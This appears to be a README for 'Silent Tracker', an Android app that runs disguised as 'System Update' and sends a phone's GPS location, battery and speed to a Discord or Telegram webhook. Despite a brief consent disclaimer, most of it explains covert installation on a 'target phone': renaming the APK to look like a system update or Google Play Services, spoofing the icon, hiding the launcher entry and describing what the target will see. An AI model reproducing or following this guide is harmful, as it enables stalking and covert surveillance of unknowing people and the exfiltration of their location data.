# Silent Tracker - Android Location Tracker

## ⚠️ IMPORTANT: Legal Notice
This tool is for **LEGITIMATE USES ONLY** such as:
- Tracking your own lost/stolen phone
- Parents monitoring children's location (with consent)
- Employees with disclosed company device tracking

**DO NOT** use this to track someone without their consent - it is illegal and unethical.

---

## Features
- 🔴 Runs silently in background (appears as "System Update")
- 📍 Sends GPS location to Discord/Telegram webhook
- 🔄 Auto-starts on device boot
- 📊 Sends battery level, accuracy, speed info
- 🗺️ Google Maps link included

---

## How to Set Up

### Step 1: Create Discord Webhook
1. Open Discord → Server Settings → Integrations
2. Click "Create Webhook"
3. Name it (e.g., "Location Tracker")
4. Copy the webhook URL (looks like: `https://discord.com/api/webhooks/...`)

### Step 2: Configure the App
Open `app/src/main/java/com/silenttracker/location/MainActivity.java` and replace:
```java
public static final String WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
```
With your actual webhook URL.

### Step 3: Build the APK
1. Open Android Studio
2. File → Open → Select the `android` folder
3. Wait for Gradle to sync
4. Build → Build Bundle(s) / APK(s) → Build APK(s)
5. APK will be at: `app/build/outputs/apk/debug/app-debug.apk`

---

## How to Install on Target Phone

### Method 1: Direct Install
1. Transfer the APK to the target phone
2. Enable "Install from unknown sources" in settings
3. Open the APK file
4. Grant location permissions when asked
5. App will close and run in background

### Method 2: Hide the APK
- Rename the APK to something innocent like:
  - `SystemUpdate.apk`
  - `SecurityPatch.apk`
  - `GooglePlayServices.apk`
- Change the app icon (in AndroidManifest.xml) to look like a system app

---

## How to Remove the APK

### Method 1: From Settings (Easiest)
1. Go to **Settings** → **Apps** (or Apps & notifications)
2. Find **"System Update"** (or whatever you named it)
3. Tap **Uninstall**

### Method 2: From Play Store (if installed as system app)
1. Go to **Google Play Store** → **My Apps**
2. Find the app and tap **Uninstall**

### Method 3: Using ADB (If you can't access phone)
```bash
adb uninstall com.silenttracker.location
```

### Method 4: Factory Reset (Last Resort)
If the app has system-level permissions and you can't uninstall:
1. Backup your data
2. Settings → Reset → Factory Data Reset

---

## What the Target Will See

- 📱 **App name**: "System Update" (or custom name you set)
- 🔔 **Notification**: Shows as "System Services" or "System Update"
- ⚠️ **One-time prompt**: Location permission request (looks like a normal app permission)

After installation, the app:
- Runs in background
- Opens briefly then closes
- No home screen icon (can be hidden)

---

## Troubleshooting

### App not sending location?
- Check webhook URL is correct
- Check internet connection
- Verify location permission is granted

### App icon showing in launcher?
- Edit AndroidManifest.xml: remove `<category android:name="android.intent.category.LAUNCHER" />`

### Location not accurate?
- Ensure "Location" is enabled on the phone
- High accuracy mode recommended

---

## Technical Details

- **Min Android**: Android 8.0 (API 26)
- **Permissions Required**:
  - ACCESS_FINE_LOCATION
  - ACCESS_COARSE_LOCATION
  - ACCESS_BACKGROUND_LOCATION
  - INTERNET
  - FOREGROUND_SERVICE
  - BOOT_COMPLETED
  - POST_NOTIFICATIONS (Android 13+)

- **Network**: Uses OkHttp to send POST requests to webhook
- **Location**: Uses Google Play Services FusedLocationProviderClient
- **Battery**: Optimized with configurable update intervals

